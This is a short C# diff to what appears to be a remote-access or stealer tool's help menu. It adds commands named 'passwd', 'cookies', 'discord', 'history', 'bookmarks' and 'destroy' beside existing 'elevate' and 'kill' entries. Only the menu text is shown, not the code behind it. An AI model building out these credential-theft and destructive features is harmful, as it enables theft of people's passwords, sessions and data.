@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -82,7 +82,13 @@ class Program
                         "  services-list [<search>]",
                         "  ps <cmdlet>",
                         "  windows",
+                        "  passwd",
+                        "  bookmarks",
+                        "  cookies",
+                        "  discord",
+                        "  history",
                         "  elevate",
+                        "  destroy",
                         "  pid",
                         "  bin",
                         "  kill",
